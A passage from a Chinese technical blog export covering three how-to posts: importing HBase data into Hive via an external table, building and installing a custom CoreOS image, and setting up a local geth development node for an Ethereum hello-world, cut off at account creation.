<li>Hive 与HBase集成， 直接从Hive里面连HBase的数据库进行查询。参考链接： <a href="https://cwiki.apache.org/confluence/display/Hive/HBaseIntegration">https://cwiki.apache.org/confluence/display/Hive/HBaseIntegration</a></li>
</ol>
<p>选项1是我们需求的逆操作， 直接忽略， 选项2,  虽然没有做专门的Benchmark, 但总感觉直接对HBase进行查询操作不怎么靠谱， 如果我们要频繁做很多类型的数据分析， 那HBase的压力一定会倍增。<br>难道没有把HBase里面的数据直接导入到Hive当中的工具或者方法吗？<br>找了一会， 似乎没找到， 那么只好自己想一个解决方案了。</p>
<p>思路：<br>利用选项2,  先打通Hive对HBase指定表的全表访问， 再建立一个新的空表， 把查询出来的数据全部导入到新表当中， 以后的所有数据分析操作在新表中完成。<br>说干就干， 让我们试一个简单的例子。</p>
<ul>
<li>首先在HBase里面建一个表， 名为 student， 包含 id 和 name 两个column  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hbase shell</span><br><span class="line">create &#x27;student&#x27;, &#x27;id&#x27;, &#x27;name&#x27;</span><br></pre></td></tr></table></figure></li>
<li>向表中插入两行数据  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">put &#x27;student&#x27;, &#x27;row1&#x27;, &#x27;id:val&#x27;, &#x27;1&#x27;</span><br><span class="line">put &#x27;student&#x27;, &#x27;row1&#x27;, &#x27;name:val&#x27;, &#x27;Tony&#x27;</span><br><span class="line">put &#x27;student&#x27;, &#x27;row2&#x27;, &#x27;id:val&#x27;, &#x27;2&#x27;</span><br><span class="line">put &#x27;student&#x27;, &#x27;row2&#x27;, &#x27;name:val&#x27;, &#x27;Mike&#x27;</span><br></pre></td></tr></table></figure>
  注意：在插入数据的时候一定要指定column (如id:val, name:val) 直接使用column family (如 id, name) 去存数据会导致后面Hive 建表的时候有问题。</li>
<li>扫描此表， 确定数据已经插入  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scan &#x27;student&#x27;</span><br><span class="line">ROW                               COLUMN+CELL                                                                                     </span><br><span class="line"> row1                             column=id:val, timestamp=1384939342989, value=1                                                 </span><br><span class="line"> row1                             column=name:val, timestamp=1384939365511, value=Tony                                            </span><br><span class="line"> row2                             column=id:val, timestamp=1384939351444, value=2                                                 </span><br><span class="line"> row2                             column=name:val, timestamp=1384939379245, value=Mike</span><br></pre></td></tr></table></figure></li>
<li>从Hive建立可以访问HBase的外部表  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE EXTERNAL TABLE student(key string, id int, name string) </span><br><span class="line">STORED BY &#x27;org.apache.hadoop.hive.hbase.HBaseStorageHandler&#x27;</span><br><span class="line">WITH SERDEPROPERTIES (&quot;hbase.columns.mapping&quot; = &quot;id:val,name:val&quot;)</span><br><span class="line">TBLPROPERTIES(&quot;hbase.table.name&quot; = &quot;student&quot;);</span><br></pre></td></tr></table></figure></li>
<li>Hive中建立一个新的空表  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">hive&gt; </span><span class="language-bash"><span class="keyword">select</span> * from student;</span></span><br><span class="line">OK</span><br><span class="line">row1    1    Tony</span><br><span class="line">row2    2    Mike</span><br></pre></td></tr></table></figure>
  但是此时这个表实际上是一个虚拟表， 实际的数据还在HBase中。 下面需要在Hive中另建一个结构一样的空表， 再把数据导出来。</li>
<li>Hive中建立一个新的空表  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE TABLE new_student (</span><br><span class="line">  key string,</span><br><span class="line">  id INT,</span><br><span class="line">  name STRING)</span><br><span class="line">ROW FORMAT DELIMITED</span><br><span class="line">FIELDS TERMINATED BY &#x27;\t&#x27;</span><br><span class="line">STORED AS TEXTFILE;</span><br></pre></td></tr></table></figure></li>
<li>将数据从HBase中导入到新的Hive表中  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">hive&gt; </span><span class="language-bash">INSERT OVERWRITE TABLE new_student SELECT * FROM student;</span></span><br><span class="line"><span class="meta prompt_">hive&gt; </span><span class="language-bash"><span class="keyword">select</span> * from new_student;</span></span><br><span class="line">OK</span><br><span class="line">row1    1    Tony</span><br><span class="line">row2    2    Mike</span><br></pre></td></tr></table></figure>
至此大功告成！<br>以后所有复杂的数据查询和数据分析都可以在new_student表中完成。</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/npumenglei/p/how_to_use_hive_load_data_from_hbase.html">Hive如何加载和导入HBase的数据</a></li>
<li><a href="http://blog.csdn.net/lifuxiangcaohui/article/details/40588929">Hive总结（七）Hive四种数据导入方式</a></li>
</ul>
]]></content>
      <categories>
        <category>Big-Data</category>
      </categories>
      <tags>
        <tag>hive</tag>
        <tag>hbase</tag>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>CoreOS镜像制作</title>
    <url>/2017/05/18/container/coreos/coreos-build/</url>
    <content><![CDATA[<p><img src="/images/coreos/coreos_build.jpg" alt="coreos_build.jpg"></p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CoreOS，一个轻量的linux分布式操作系统。CoreOS中的应用都以容器形式在系统中运行。个人觉得CoreOS不能算是一个linux发行版，只能算是一种订制系统。(BTW，CoreOS的订制应该是源自Gentoo这个发行版)</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>CoreOS的编译与操作系统无关（此处使用的是RHEL7.2），硬件要求必须是X86-64系统。</li>
<li>编译系统必须安装 curl、git、python2、bzip2</li>
<li>CoreOS SDK编译有两种方法（<a href="https://coreos.com/os/docs/latest/sdk-modifying-coreos.html">Option1 &amp; Option2</a>），Option1 需要选择和需要编译的CoreOS相匹配的golang版本。</li>
<li>使用Option2 方法安装，需要设置<code>https_proxy</code>代理（否则，无法法访问GoogleSource）</li>
</ul>
<h1 id="制作-安装"><a href="#制作-安装" class="headerlink" title="制作&amp;安装"></a>制作&amp;安装</h1><p>本人使用Option2方法完成CoreOS编译，并使用coreos-install安装CoreOS到xen vm上。</p>
<h2 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="安装Repo"><a href="#安装Repo" class="headerlink" title="安装Repo"></a>安装Repo</h4><p>下载repo，用于下载CoreOS SDK</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://storage.googleapis.com/git-repo-downloads/repo &gt; ./repo</span><br><span class="line">chmod a+x ./repo</span><br></pre></td></tr></table></figure>

<h4 id="下载SDK"><a href="#下载SDK" class="headerlink" title="下载SDK"></a>下载SDK</h4><p>创建一个目录用于存放coreos sdk</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir coreos</span><br><span class="line">cd coreos</span><br></pre></td></tr></table></figure>
<p>repo初始化目录，并同步git repos</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">repo init -u https://github.com/coreos/manifest.git</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure>

<h4 id="Chroot到coreos-SDK"><a href="#Chroot到coreos-SDK" class="headerlink" title="Chroot到coreos SDK"></a>Chroot到coreos SDK</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./chromite/bin/cros_sdk</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><h4 id="设置core用户登陆密码"><a href="#设置core用户登陆密码" class="headerlink" title="设置core用户登陆密码"></a>设置core用户登陆密码</h4><p>设置core用户密码，已被系统安装完后登陆系统使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./set_shared_user_password.sh</span><br></pre></td></tr></table></figure>

<h4 id="选择目标编译平台"><a href="#选择目标编译平台" class="headerlink" title="选择目标编译平台"></a>选择目标编译平台</h4><p>选择<code>amd64-usr</code>或<code>arm64-usr</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./setup_board --default --board=amd64-usr</span><br></pre></td></tr></table></figure>

<h4 id="编译Packages"><a href="#编译Packages" class="headerlink" title="编译Packages"></a>编译Packages</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build_packages</span><br></pre></td></tr></table></figure>

<h4 id="制作CoreOS镜像"><a href="#制作CoreOS镜像" class="headerlink" title="制作CoreOS镜像"></a>制作CoreOS镜像</h4><p>可以选择编译开发版(<code>dev</code>)还是生成版(<code>prod</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./build_image prod</span><br></pre></td></tr></table></figure>

<h4 id="制作可以引导CoreOS镜像"><a href="#制作可以引导CoreOS镜像" class="headerlink" title="制作可以引导CoreOS镜像"></a>制作可以引导CoreOS镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./image_to_vm.sh --board=amd64-usr --format=xen --from=/mnt/host/source/src/build/images/amd64-usr/developer-1409.0.0+2017-05-15-1456-a1/coreos_production_image.bin --disk_layout=base</span><br></pre></td></tr></table></figure>
<ul>
<li><code>--format</code> 根据不同需要选择制作不同格式的可引导镜像</li>
<li><code>--disk_layout</code> 默认是空，建议选择<code>base</code></li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>*** 经过上述步骤的操作，已经将coreos镜像制作完成，并放置在”.&#x2F;src&#x2F;build&#x2F;images&#x2F;amd64-usr”目录下。 ***</p>
<p>安装的过程需要使用liveCD启动，然后挂在需要安装的裸盘，使用<code>coreos-install</code>安装。镜像的传递是，先将镜像放置到一个webserver上，然后<code>coreos-install</code>再通过这个webserver下载、并安装。</p>
<p>*** 在将镜像放置到webserver之前，需要先将镜像压缩成bz2文件，然后再将bz2进行签名 ***（签名无法使用官方的私钥，只能自己申请，<a href="https://zhoubofsy.github.io/2017/05/18/security/gpg-usage/">详细请见</a>）。</p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>*** 本人的安装步骤，不是唯一的、方便、快捷的方法，更多安装方式建议阅者自行调研 ***</p>
<h4 id="下载coreos-install安装脚本"><a href="#下载coreos-install安装脚本" class="headerlink" title="下载coreos-install安装脚本"></a>下载coreos-install安装脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/coreos/init/master/bin/coreos-install</span><br></pre></td></tr></table></figure>

<h4 id="修改coreos-install中的公钥"><a href="#修改coreos-install中的公钥" class="headerlink" title="修改coreos-install中的公钥"></a>修改coreos-install中的公钥</h4><p>在coreos-install中有个变量<code>GPG_KEY</code>用于存储官方的公钥，需要将这个公钥换成你给镜像签名时对应的公钥。</p>
<p>** 此处略去俺公钥内容 **</p>
<p>镜像在下载到目标机后，coreos-install会对下载的镜像进行校验，这是不替换公钥，只能想办法让官方帮你签名</p>
<h4 id="使用coreos-install安装CoreOS"><a href="#使用coreos-install安装CoreOS" class="headerlink" title="使用coreos-install安装CoreOS"></a>使用coreos-install安装CoreOS</h4><p>使用liveCD启动系统后，先确认需要安装CoreOS的硬盘，然后执行<code>coreos-install</code>进行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./coreos-install -d /dev/xvda -V 1409.0.0 -o xen -v -b http://192.168.1.82:8000 -c /media/configdrive/openstack/latest/user_data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-d</code> 指定安装目标设备</li>
<li><code>-V</code> 指定安装版本，一定要与URL中的路径能匹配上</li>
<li><code>-o</code> 镜像名称中需要指出是<code>xen</code>or<code>kvm</code>or…</li>
<li><code>-b</code> 镜像下载URL</li>
</ul>
<h1 id="问题-解决"><a href="#问题-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h1><h2 id="不能引导问题"><a href="#不能引导问题" class="headerlink" title="不能引导问题"></a>不能引导问题</h2><p>若成功编译安装，但不能正常引导，可以对比做bzip2之前镜像的前512字节和安装后xvda的前512字节是否一致。本人遇到不能引导问题，是因为本应使用<code>bzip2</code>压缩的镜像使用了<code>tar</code></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li>感谢同事为我提供的VPN翻墙服务</li>
<li>感谢同事为我提供的WebService服务，方便完成网络安装CoreOS</li>
<li><a href="https://coreos.com/os/docs/latest/sdk-modifying-coreos.html">container linux document</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>coreos</tag>
        <tag>os</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello Ethereum</title>
    <url>/2022/11/07/blockchain/ethereum/eth-helloworld/</url>
    <content><![CDATA[<p>问：写一个以太坊智能合约helloworld总共分几步？<br>答：三步，第一步创建以太坊服务环境；第二步撰写、编译、部署helloworld智能合约；第三步运行智能合约</p>
<h1 id="部署Ethereum环境"><a href="#部署Ethereum环境" class="headerlink" title="部署Ethereum环境"></a>部署Ethereum环境</h1><p>本人使用docker搭建Ethereum环境，拉取<code>ubuntu:20.04</code>镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull --platform linux/amd64 ubuntu:20.04</span><br></pre></td></tr></table></figure>

<p>然后，创建容器并开始安装Ethereum</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it --name eth_server --net host ubuntu:20.04 /bin/bash</span><br><span class="line">docker run -it --net bridge -p 8545:8545 -p 8551:8551 --name eth_server ubuntu:20.04 /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="安装Ethereum"><a href="#安装Ethereum" class="headerlink" title="安装Ethereum"></a>安装Ethereum</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apt update -y</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apt install -y software-properties-common</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">add-apt-repository -y ppa:ethereum/ethereum</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apt update -y</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apt install -y ethereum</span></span><br></pre></td></tr></table></figure>

<p>安装成功后，确认一下eth版本。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geth version</span></span><br><span class="line">Geth</span><br><span class="line">Version: 1.10.26-stable</span><br><span class="line">Git Commit: e5eb32acee19cc9fca6a03b10283b7484246b15a</span><br><span class="line">Architecture: amd64</span><br><span class="line">Go Version: go1.18.5</span><br><span class="line">Operating System: linux</span><br><span class="line">GOPATH=</span><br><span class="line">GOROOT=go</span><br></pre></td></tr></table></figure>

<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>创建一个<code>genesis.json</code>的文件，填充如下内容。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;chainId&quot;</span><span class="punctuation">:</span> <span class="number">110</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;homesteadBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;byzantiumBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;constantinopleBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;eip150Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;eip155Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;eip158Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;difficulty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;gasLimit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2100000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alloc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="初始化Ethereum数据"><a href="#初始化Ethereum数据" class="headerlink" title="初始化Ethereum数据"></a>初始化Ethereum数据</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geth --datadir ./eth-data --allow-insecure-unlock --http --http.addr 172.17.0.2 --http.api <span class="string">&quot;admin,debug,web3,eth,txpool,personal,ethash,miner,net&quot;</span> --http.corsdomain <span class="string">&quot;*&quot;</span> --dev init genesis.json</span></span><br><span class="line">INFO [11-07|16:04:14.139] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [11-07|16:04:14.151] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">INFO [11-07|16:04:14.179] Set global gas cap                       cap=50,000,000</span><br><span class="line">INFO [11-07|16:04:14.190] Allocated cache and file handles         database=/root/eth-data/geth/chaindata cache=16.00MiB handles=16</span><br><span class="line">INFO [11-07|16:04:14.224] Opened ancient database                  database=/root/eth-data/geth/chaindata/ancient/chain readonly=false</span><br><span class="line">INFO [11-07|16:04:14.226] Writing custom genesis block</span><br><span class="line">INFO [11-07|16:04:14.230] Persisted trie from memory database      nodes=0 size=0.00B time=&quot;347µs&quot; gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B</span><br><span class="line">INFO [11-07|16:04:14.238] Successfully wrote genesis state         database=chaindata                     hash=a697c6..9bf39b</span><br><span class="line">INFO [11-07|16:04:14.238] Allocated cache and file handles         database=/root/eth-data/geth/lightchaindata cache=16.00MiB handles=16</span><br><span class="line">INFO [11-07|16:04:14.259] Opened ancient database                  database=/root/eth-data/geth/lightchaindata/ancient/chain readonly=false</span><br><span class="line">INFO [11-07|16:04:14.259] Writing custom genesis block</span><br><span class="line">INFO [11-07|16:04:14.261] Persisted trie from memory database      nodes=0 size=0.00B time=&quot;21.917µs&quot; gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B</span><br><span class="line">INFO [11-07|16:04:14.262] Successfully wrote genesis state         database=lightchaindata                     hash=a697c6..9bf39b</span><br></pre></td></tr></table></figure>

<h2 id="启动节点"><a href="#启动节点" class="headerlink" title="启动节点"></a>启动节点</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geth --datadir ./eth-data --networkid 110 --allow-insecure-unlock --http --http.addr 172.17.0.2 --http.api <span class="string">&quot;admin,debug,web3,eth,txpool,personal,ethash,miner,net&quot;</span> --http.corsdomain <span class="string">&quot;*&quot;</span> --dev</span></span><br><span class="line">INFO [11-07|16:14:23.231] Starting Geth in ephemeral dev mode...</span><br><span class="line">WARN [11-07|16:14:23.234] You are running Geth in --dev mode. Please note the following:</span><br><span class="line"></span><br><span class="line">  1. This mode is only intended for fast, iterative development without assumptions on</span><br><span class="line">     security or persistence.</span><br><span class="line">  2. The database is created in memory unless specified otherwise. Therefore, shutting down</span><br><span class="line">     your computer or losing power will wipe your entire block data and chain state for</span><br><span class="line">     your dev environment.</span><br><span class="line">  3. A random, pre-allocated developer account will be available and unlocked as</span><br><span class="line">     eth.coinbase, which can be used for testing. The random dev account is temporary,</span><br><span class="line">     stored on a ramdisk, and will be lost if your machine is restarted.</span><br><span class="line">  4. Mining is enabled by default. However, the client will only seal blocks if transactions</span><br><span class="line">     are pending in the mempool. The miner&#x27;s minimum accepted gas price is 1.</span><br><span class="line">  5. Networking is disabled; there is no listen-address, the maximum number of peers is set</span><br><span class="line">     to 0, and discovery is disabled.</span><br><span class="line">INFO [11-07|16:14:23.251] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [11-07|16:14:23.261] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">INFO [11-07|16:14:23.291] Set global gas cap                       cap=50,000,000</span><br><span class="line">INFO [11-07|16:14:23.649] Using developer account                  address=0xA9CB6DB62D6673ae5CD79D0d29796Dd9DF1d1A5e</span><br><span class="line">INFO [11-07|16:14:23.652] Allocated cache and file handles         database=/root/eth-data/geth/chaindata cache=512.00MiB handles=524,288 readonly=true</span><br><span class="line">INFO [11-07|16:14:23.675] Opened ancient database                  database=/root/eth-data/geth/chaindata/ancient/chain readonly=true</span><br><span class="line">INFO [11-07|16:14:23.691] Allocated trie memory caches             clean=154.00MiB dirty=256.00MiB</span><br><span class="line">INFO [11-07|16:14:23.691] Allocated cache and file handles         database=/root/eth-data/geth/chaindata cache=512.00MiB handles=524,288</span><br><span class="line">INFO [11-07|16:14:23.756] Opened ancient database                  database=/root/eth-data/geth/chaindata/ancient/chain readonly=false</span><br><span class="line">INFO [11-07|16:14:23.763]</span><br><span class="line">INFO [11-07|16:14:23.764] ---------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">INFO [11-07|16:14:23.764] Chain ID:  110 (unknown)</span><br><span class="line">INFO [11-07|16:14:23.764] Consensus: unknown</span><br><span class="line">INFO [11-07|16:14:23.764]</span><br><span class="line">INFO [11-07|16:14:23.765] Pre-Merge hard forks:</span><br><span class="line">INFO [11-07|16:14:23.765]  - Homestead:                   0        (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/homestead.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Tangerine Whistle (EIP 150): 0        (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/tangerine-whistle.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Spurious Dragon/1 (EIP 155): 0        (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/spurious-dragon.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Spurious Dragon/2 (EIP 158): 0        (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/spurious-dragon.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Byzantium:                   &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/byzantium.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Constantinople:              &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/constantinople.md)</span><br><span class="line">INFO [11-07|16:14:23.765]  - Petersburg:                  &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/petersburg.md)</span><br><span class="line">INFO [11-07|16:14:23.766]  - Istanbul:                    &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/istanbul.md)</span><br><span class="line">INFO [11-07|16:14:23.766]  - Berlin:                      &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/berlin.md)</span><br><span class="line">INFO [11-07|16:14:23.766]  - London:                      &lt;nil&gt; (https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/london.md)</span><br><span class="line">INFO [11-07|16:14:23.766]</span><br><span class="line">INFO [11-07|16:14:23.766] The Merge is not yet available for this network!</span><br><span class="line">INFO [11-07|16:14:23.766]  - Hard-fork specification: https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/paris.md</span><br><span class="line">INFO [11-07|16:14:23.766] ---------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">INFO [11-07|16:14:23.766]</span><br><span class="line">INFO [11-07|16:14:23.768] Disk storage enabled for ethash caches   dir=/root/eth-data/geth/ethash count=3</span><br><span class="line">INFO [11-07|16:14:23.768] Disk storage enabled for ethash DAGs     dir=/root/.ethash              count=2</span><br><span class="line">INFO [11-07|16:14:23.769] Initialising Ethereum protocol           network=1337 dbversion=8</span><br><span class="line">INFO [11-07|16:14:23.779] Loaded most recent local header          number=0 hash=a697c6..9bf39b td=0 age=53y7mo1w</span><br><span class="line">INFO [11-07|16:14:23.780] Loaded most recent local full block      number=0 hash=a697c6..9bf39b td=0 age=53y7mo1w</span><br><span class="line">INFO [11-07|16:14:23.780] Loaded most recent local fast block      number=0 hash=a697c6..9bf39b td=0 age=53y7mo1w</span><br><span class="line">INFO [11-07|16:14:23.786] Loaded local transaction journal         transactions=0 dropped=0</span><br><span class="line">INFO [11-07|16:14:23.786] Regenerated local transaction journal    transactions=0 accounts=0</span><br><span class="line">INFO [11-07|16:14:23.791] Gasprice oracle is ignoring threshold set threshold=2</span><br><span class="line">WARN [11-07|16:14:23.798] Engine API enabled                       protocol=eth</span><br><span class="line">WARN [11-07|16:14:23.798] Engine API started but chain not configured for merge yet</span><br><span class="line">INFO [11-07|16:14:23.802] Starting peer-to-peer node               instance=Geth/v1.10.26-stable-e5eb32ac/linux-amd64/go1.18.5</span><br><span class="line">WARN [11-07|16:14:23.802] P2P server will be useless, neither dialing nor listening</span><br><span class="line">INFO [11-07|16:14:23.843] New local node record                    seq=1,667,808,816,313 id=321fce2047223769 ip=127.0.0.1 udp=0 tcp=0</span><br><span class="line">INFO [11-07|16:14:23.844] Started P2P networking                   self=enode://2d0246c1dd51623d6d8a8581095c033542366037b1e20ff815ad045af396de50df60f4aa9556148c2f4a89673bad5cab5c2ab22f3075d5bacba1b2fbebaf72e5@127.0.0.1:0</span><br><span class="line">INFO [11-07|16:14:23.848] IPC endpoint opened                      url=/root/eth-data/geth.ipc</span><br><span class="line">INFO [11-07|16:14:23.852] Loaded JWT secret file                   path=/root/eth-data/geth/jwtsecret crc32=0xef39c4cb</span><br><span class="line">INFO [11-07|16:14:23.856] HTTP server started                      endpoint=172.17.0.2:8545 auth=false prefix= cors= vhosts=localhost</span><br><span class="line">INFO [11-07|16:14:23.862] WebSocket enabled                        url=ws://127.0.0.1:8551</span><br><span class="line">INFO [11-07|16:14:23.862] HTTP server started                      endpoint=127.0.0.1:8551    auth=true  prefix= cors=localhost vhosts=localhost</span><br><span class="line">INFO [11-07|16:14:23.868] Transaction pool price threshold updated price=0</span><br><span class="line">INFO [11-07|16:14:23.868] Updated mining threads                   threads=0</span><br><span class="line">INFO [11-07|16:14:23.868] Transaction pool price threshold updated price=1</span><br><span class="line">INFO [11-07|16:14:23.868] Etherbase automatically configured       address=0xA9CB6DB62D6673ae5CD79D0d29796Dd9DF1d1A5e</span><br><span class="line">INFO [11-07|16:14:23.875] Commit new sealing work                  number=1 sealhash=6ca53b..19dc17 uncles=0 txs=0 gas=0 fees=0 elapsed=6.285ms</span><br><span class="line">INFO [11-07|16:14:23.877] Commit new sealing work                  number=1 sealhash=6ca53b..19dc17 uncles=0 txs=0 gas=0 fees=0 elapsed=8.056ms</span><br></pre></td></tr></table></figure>

<h3 id="networkid"><a href="#networkid" class="headerlink" title="networkid"></a>networkid</h3><p><code>--networkid</code>参数需要与<code>genesis.json</code>配置文件中的<code>chainId</code>值一致。</p>
<h3 id="http-api"><a href="#http-api" class="headerlink" title="http.api"></a>http.api</h3><p>若<code>--http.api</code>设置错误会出现如下错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR[11-07|16:13:36.346] Unavailable modules in HTTP API list     unavailable=[db] available=&quot;[admin debug web3 eth txpool personal ethash miner net]&quot;</span><br></pre></td></tr></table></figure>
<p>需要按照<code>available</code>中规定的内容进行配置<code>--http.api</code>参数。</p>
<h2 id="attach交互"><a href="#attach交互" class="headerlink" title="attach交互"></a>attach交互</h2><p>接下来需要attach到以太坊节点，在geth节点启动过程中有这样一条日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">INFO [11-07|16:14:23.848] IPC endpoint opened                      url=/root/eth-data/geth.ipc</span><br></pre></td></tr></table></figure>
<p>没错，你猜对了，就是要用这个endpoint进行attach</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geth attach ipc:/root/eth-data/geth.ipc</span></span><br><span class="line">Welcome to the Geth JavaScript console!</span><br><span class="line"></span><br><span class="line">instance: Geth/v1.10.26-stable-e5eb32ac/linux-amd64/go1.18.5</span><br><span class="line">coinbase: 0xa9cb6db62d6673ae5cd79d0d29796dd9df1d1a5e</span><br><span class="line">at block: 0 (Thu Jan 01 1970 08:00:00 GMT+0800 (CST))</span><br><span class="line"> datadir: /root/eth-data</span><br><span class="line"> modules: admin:1.0 debug:1.0 engine:1.0 eth:1.0 ethash:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0</span><br><span class="line"></span><br><span class="line">To exit, press ctrl-d or type exit</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来的<code>创建用户</code>、<code>挖矿</code>等操作都需要在attach状态下进行。</p>
<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>使用<code>personal.newAccout</code>创建用户，然后可以使用<code>eth.accounts</code>查看用户列表。</p>
